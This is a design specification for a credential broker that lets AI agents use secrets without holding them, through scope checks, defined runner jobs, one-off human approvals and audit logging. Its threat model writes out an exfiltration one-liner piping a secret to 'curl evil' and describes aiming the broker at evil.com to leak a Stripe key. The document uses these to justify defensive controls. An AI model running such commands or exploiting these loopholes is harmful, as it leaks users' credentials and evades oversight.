---
title: "Secrets and mediated execution"
kicker: "Product SOT"
description: "How secrets.aweb.ai lets agents use credentials without holding them: a server-side broker for URI APIs, a user-run runner for everything else, with every use scope-checked, policy-gated, and recorded through the audit hook."
weight: 28
---

# Secrets and mediated execution

This is the source of truth for `secrets.aweb.ai` and `aw do`.

The product promise:

> Agents **use** approved secrets without ever holding them, and humans get a
> signed record of when, why, by whom, and under which approval the secret was
> used.

This is launch-critical because real company work almost always touches
credentials. The right answer is not to let agents read secrets, and it is not to
inject a secret into a command the agent chose — it is to let agents request
**secret-mediated actions** where the secret stays on the far side of a boundary
the agent cannot reach.

## 1. The impossibility we are designing around

If a secret value enters a process whose command the agent chooses, the agent can
read it — `aw do DB_SECRET -- bash -c 'echo $DB_SECRET | curl evil'` wins.
Env-vs-argv injection only prevents *accidental* leakage (process listings, shell
history); it does nothing against an agent that *wants* the value.

Therefore: **the agent must never choose the process the secret enters.** The unit
is not "give me the secret to run my command"; it is "perform this operation
through the holder, and return me the result." This also makes the audit
boundary enforced rather than voluntary: if the only way to act is through the
holder, the act is recorded by construction.

## 2. Two execution surfaces

- **Server-brokered URI APIs** — anything reachable by a URI is brokered by our
  server. No user setup. The secret stays in `secrets.aweb.ai`.
- **User-run runner** — anything else (a database wire protocol, a shell tool, IaC)
  can only be reached from the user's own environment, so the user runs a broker
  there. It executes **defined operations**, never arbitrary agent commands.

## 3. Server-brokered URI APIs

The agent sends "make this request using secret ref X"; the server validates,
injects the credential, calls the real API, redacts, returns the response, and
fires `post-secret-use-hook`. The agent never sees the value.

```text
agent -> secrets.broker-request { secret_ref, method, url, headers, body }
  -> validate url in secret.allowed_uris  (refuse + audit if out of scope)
  -> check grant + policy + approval
  -> inject credential per secret.kind     (server implements the auth scheme)
  -> call the real API
  -> redact response
  -> return response to agent
  -> fire post-secret-use-hook (ledger write + deliver to logs)
```

### The one control that makes this safe: scope-binding

Every secret carries `allowed_uris` (host + path-prefix + method allow-list). The
broker **refuses to inject** for any URL outside that scope, and audits the
refusal. Without this, an agent points the broker at `https://evil.com`, the
broker injects `STRIPE_KEY`, and you have built an exfiltration device. This check
is the whole safety of the brokered surface.

### Auth schemes (the server implements them, server-side)

`secret.kind` is one of, and the broker performs the scheme so the raw secret
never leaves the server:

- `bearer`, `basic`, `header`, `query-param` — simple injection;
- `aws-sigv4` — the broker **signs** the request with the secret;
- `oauth2-client-credentials` / `oauth2-refresh` — the broker performs the token
  exchange;
- `mtls-client-cert` — the broker holds the client cert/key.

So "URI-brokerable" covers signed and OAuth APIs (AWS, GitHub, Slack, OpenAI,
internal HTTP services), not only simple-key APIs.

### Granularity

- **Open request within host scope** — the agent sends any call to the allowed
  host; the broker logs it. Generic, ship-it-now.
- **Named operations** (`operation_template`) — the secret is bound to specific
  parameterized operations (`charge ≤ $X`); the agent invokes the operation. This
  bounds the *access*, not just the secret. The hardening target after launch.

## 4. User-run runner (non-URI tasks)

For tasks our server cannot reach, the user runs a runner in their environment.

```text
agent -> secrets.run-job { runner, job, params }
  -> route to the user's runner
  -> runner executes the DEFINED job with the secret in ITS process
  -> returns result + fires post-secret-use-hook
```

The runner is the user's trusted component. The critical constraint:

> The runner executes **defined operations**, not arbitrary agent commands.

"User-controlled" gives the user the *ability* to make it safe; it is safe only
because it runs a constrained job set the user defined. A runner wired as
`bash -c "<agent input>"` with the secret in env is the §1 hole on the user's box.
Where the runner must run a real tool needing creds in env (terraform), prefer
issuing a **short-lived, scoped, revocable** credential over the durable secret —
honestly labeled as reduced-blast-radius, not confidentiality.

## 5. Data model

- `secret`: `ref`, description, `kind`, **`allowed_uris`**, sealed value, version,
  owner, rotation metadata, **`approve_only`** (every use needs a fresh one-off
  human approval — §13).
- `secret_grant`: which agents/roles may use which secret, with policy
  (`approval_required`, rate limit, time window, optional operation allow-list).
- `use_request` / `approval`: pending → one-off approval link minted → human
  decision → scoped, time-limited. Carries the link `token`, expiry, and the
  redacted request the human sees.
- `operation_template`: a named parameterized operation bound to a secret.
- `runner`, `runner_job`: a user executor and its defined job set.

## 6. Manifest tools (`aw secrets <verb>`)

Auth: team-cert + scope. Tools:

- `secrets.list-refs` (`secrets:read`) — refs / labels / scopes / policy. **Never
  values.**
- `secrets.broker-request` (`secrets:use`) — §3.
- `secrets.request-use` — approval-gated path.
- `secrets.run-job` (`secrets:run`) — §4.
- `secrets.create` / `secrets.set-uris` / `secrets.grant` / `secrets.rotate`
  (`secrets:admin`) — owner-only; how secrets get stored, scoped, and granted.

**Never expose** `secrets.get-value`. There is no general-purpose value read.

## 7. `aw do` (reframed)

`aw do` is the local-agent ergonomic wrapper, and it is **sugar over the broker**,
not raw injection:

```bash
aw do --secret STRIPE_KEY -- request POST https://api.stripe.com/v1/charges --data ...
aw do --secret DEPLOY_KEY  -- job deploy-staging
```

For URI APIs it calls `secrets.broker-request`; for runner jobs it calls
`secrets.run-job`. **The prior model — injecting the raw secret into an arbitrary
agent-chosen command (env/fd/stdin/file) — is removed as the default.** It may
remain only as an explicit, discouraged `--unsafe-inject` fallback, clearly
labelled "audit + careless-leak protection, not confidentiality," for legacy
local tools that cannot be brokered or run as a defined job.

## 8. Security spine

1. **Scope-bind before inject** — out-of-scope URL ⇒ refuse, no injection, audit.
2. **Auth-scheme-aware injection** — the raw secret never leaves the server, even
   for signed/OAuth APIs.
3. **Runner runs defined jobs**, not agent commands.
4. **No value egress** — no `get-value`; responses redacted for known secret
   values; the broker/runner is the only path.
5. **Remove the raw secret from the agent's reach** — the secret lives *only* in
   `secrets.aweb.ai` (or the runner); the agent's environment is deliberately
   credential-empty. The "gate important things ⇒ guaranteed logging" property
   holds only if the broker is the agent's *sole* path to the resource.
6. **Grant + approval** — per-agent/role grants; sensitive secrets are tagged
   `approve_only` and require a fresh **one-off human approval link** per use (§13).
7. **Sealed at rest** (KMS now, HSM later).

## 9. The audit relationship

Every brokered use and every refusal fires `post-secret-use-hook`
(see `aw-hooks-sot`), server-side, written to the team audit ledger and delivered
to `logs.aweb.ai`. The payload carries `secret_ref` (never the value), action,
target host/operation, request hash, approval id, actor, and result. Because the
broker is the agent's only path to the credential, this is the enforced,
non-bypassable record of every important action — the reason secrets and logs are
designed together.

## 10. Launch scope

Prove:

- an owner stores a secret with `allowed_uris` + one simple kind + one signed kind
  (SigV4 *or* OAuth2-client-credentials);
- an agent lists refs and makes a brokered URI call, never sees the value, and an
  out-of-scope URL is refused;
- one approval-gated secret with a human approval;
- every use fires `post-secret-use-hook` → a signed audit entry;
- one user-runner defined job end-to-end (or fast-follow).

Do not block launch on: full auth-scheme coverage, named-operation templates,
runner fleet, secret rotation workflows, HSM custody, multi-party approval.

## 11. Future hardening

Short-lived scoped leases; named-operation templates everywhere; per-operation
egress/network controls; runner attestations; HSM/KMS-backed custody; break-glass
policy; rotation workflows; richer output redaction and leak detection.

## 12. Self-contained

`secrets.aweb.ai` manages everything in its own db — secrets, grants, approvals,
runners, templates, and its operational record of brokered uses. The only thing it
requires from outside its own scope is the **aw hook** it fires. Three boundary
touches, none of which is the aweb coordination server:

1. **Identity** — it verifies the agent's team cert cryptographically (against the
   team DID) and checks its own grant table. Its one external dependency is the
   **identity layer** (awid) for current-key / revocation — the shared naapp trust
   root, not the aweb app server.
2. **Grants are DID / app-local-role based**, resolved from the cert, not the core
   role/membership system — so `secrets` stays self-contained.
3. **Approval** — `approve_only` secrets approve through a one-off human link
   (§13), end-to-end inside the app; no team-chat coupling.

## 13. Approve-only secrets and one-off human links

A secret can be tagged **`approve_only`**: it cannot be used until a human approves
*that specific use*. The mechanism is the same one-off human-link pattern folio
uses to let a human view or edit a doc (`mint_presentation_link` — a scoped,
revocable, expiring token URL the human opens without an account; same family as
passwordless magic-link auth).

Flow:

```text
agent requests use of an approve_only secret
  -> secrets does NOT proceed; it MINTS a one-off approval link (signed, expiring,
       single-use), bound to this exact pending request, and emits it to the
       designated approver (their registered contact / the owner surface)
  -> the human opens the link and sees the REDACTED request:
       which secret ref (never the value), what action / target host or operation,
       which agent, when
  -> human approves or denies, authenticated by the link itself (no account)
  -> on approve: the pending use proceeds, once, within the approval's scope/expiry
     on deny / expiry: refused
```

Properties: the link is **single-use and request-scoped** (approving authorizes
*that* use, not a standing grant), **expiring**, **revocable**, and **unguessable**
(signed token). The human gives **informed consent** — they see exactly what is
being requested before approving. The mint, the human decision, and the resulting
use each fire `post-secret-use-hook` into the audit log. Who may approve is set by
the secret's grant/policy. This is the concrete answer to the approval boundary
touch in §12: approval is end-to-end inside `secrets`, reusing the folio human-link
primitive.
